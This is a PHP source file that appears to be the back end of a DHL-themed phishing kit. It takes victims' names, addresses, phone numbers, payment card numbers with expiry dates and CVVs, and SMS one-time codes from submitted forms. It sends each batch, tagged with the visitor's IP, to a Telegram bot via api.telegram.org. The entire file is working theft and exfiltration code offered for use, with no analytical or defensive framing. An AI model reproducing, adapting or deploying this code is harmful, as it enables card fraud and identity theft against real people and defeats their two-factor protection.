<?php 
@session_start();
require '../config.php';

$ip = $_SERVER['REMOTE_ADDR'];

function hit($link){
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $link);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	return curl_exec($c);
	curl_close($c);
}

 

 





if(isset($_POST['name'])){
	
	
$text = urlencode("
DHL Info / $ip
---------------------------------------------------
| Name : ".$_POST['name']."
| Address : ".$_POST['address']."
| State : ".$_POST['state']." 
| City : ".$_POST['city']." 
| Zip : ".$_POST['zip']." 
| Phone : ".$_POST['phone']." 
---------------------------------------------------
");
	


foreach($chat_ids as $id){
	$link = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
	hit($link);
}
	
}




if(isset($_POST['cc'])){
	
	$_SESSION['cc'] = $_POST['cc'];
	
$text = urlencode("
DHL CC / $ip
---------------------------------------------------
| Cc : ".$_POST['cc']."
| Exp : ".$_POST['exp']." 
| Cvv : ".$_POST['cvv']." 
---------------------------------------------------
");
	


foreach($chat_ids as $id){
	$link = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
	hit($link);
}
	
}




if(isset($_POST['sms'])){
	
$text = urlencode("
DHL SMS / $ip
---------------------------------------------------
| OTP : ".$_POST['sms']."
| Cc : ".$_SESSION['cc']."
---------------------------------------------------
");
	


foreach($chat_ids as $id){
	$link = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
	hit($link);
}
	
}


 

?>